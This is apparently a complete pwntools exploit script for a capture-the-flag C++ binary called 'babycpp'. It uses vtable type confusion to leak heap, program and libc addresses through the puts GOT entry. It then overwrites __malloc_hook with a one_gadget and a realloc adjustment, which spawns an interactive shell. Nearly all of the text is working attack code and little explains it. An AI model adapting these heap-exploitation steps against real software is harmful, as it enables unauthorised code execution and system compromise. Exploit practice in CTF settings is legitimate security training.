#coding=utf-8
# 2.27
from pwn import *
local = 1
exec_file="./babycpp"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000000C37)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice:",str(idx))
hash = []
number  = 0
def add(flag):
    global number
    global hash
    menu(0)
    menu(flag)
    print "number :"+str(number)
    hash.append(p8(number)+'\x00')
    number+=1
def show(idx1,idx2):#idx1 array_idx , idx2 element_idx
    menu(1)
    a.sendafter("Input array hash:",hash[idx1])
    a.sendlineafter("Input idx:",str(idx2))

def StringNewElement(idx1,idx2,len,content):
    menu(2)
    a.sendafter("hash:",hash[idx1])
    a.sendlineafter("Input idx:",str(idx2))
    a.sendlineafter("Input the len of the obj:",str(len))
    a.sendafter("Input your content:",content)
def StringEdit(idx1,idx2,content):
    menu(2)
    a.sendafter("hash:",hash[idx1])
    a.sendlineafter("Input idx:",str(idx2))
    a.sendafter("Input your content:",content)
def IntEdit(idx1,idx2,value):
    menu(2)
    a.sendafter("hash:",hash[idx1])
    a.sendlineafter("Input idx:",str(idx2))
    a.sendlineafter("Input val:",(value))
def UpdateHash(idx1,idx2,hash1):
    menu(3)
    a.sendafter("hash:",hash[idx1])
    a.sendlineafter("Input idx:",str(idx2))
    a.sendafter(":",hash1)
IntVtable = '\xe0\x5c'
StringVtable = '\x00\x5d'
add(1)# 0 IntArray
add(2)# 1 StringArray
add(2)# 2 StringArray

StringNewElement(1,0,0x100,'A')
UpdateHash(1,0x80000000,IntVtable)# baopo
show(1,0)
a.recvuntil("is ")
heap_base = int(a.recvuntil("\n",drop=True),16)-0x120b0
fuck(heap_base)

target_addr = 0x555555768e70-0x555555757000+heap_base
payload = p64(target_addr)
payload += p32(0x100)

StringNewElement(2,0,0x100,payload)
target_addr = 0x555555769200 - 0x555555757000+heap_base
#debug()
IntEdit(1,0,hex(target_addr))
#debug()
UpdateHash(1,0x80000000,StringVtable)
show(1,0)
#debug()
a.recvuntil("tent:")
text_base = u64(a.recvuntil("\n",drop=True)+'\x00\x00')-0x000000000201CE0
fuck(text_base)

puts_got = elf.got["puts"] + text_base
payload = p64(puts_got)
payload += p32(0x100)
StringEdit(2,0,payload)
UpdateHash(1,0x80000000,IntVtable)
IntEdit(1,0,hex(target_addr))
UpdateHash(1,0x80000000,StringVtable)
show(1,0)
a.recvuntil("tent:")
puts_addr=u64(a.recv(6)+'\x00\x00')
fuck(puts_addr)
libc_base = puts_addr - libc.symbols["puts"]
fuck(libc_base)
__malloc_hook = libc_base + libc.symbols["__malloc_hook"]
one = libc_base+ 0x4f2c5
fuck(__malloc_hook)
fuck(one)
payload = p64(__malloc_hook-8)
payload += p32(0x100)
StringEdit(2,0,payload)
UpdateHash(1,0x80000000,IntVtable)
IntEdit(1,0,hex(target_addr))
UpdateHash(1,0x80000000,StringVtable)
StringEdit(1,0,p64(one)+p64(libc_base+libc.symbols["realloc"]+6))
add(1)
a.interactive()


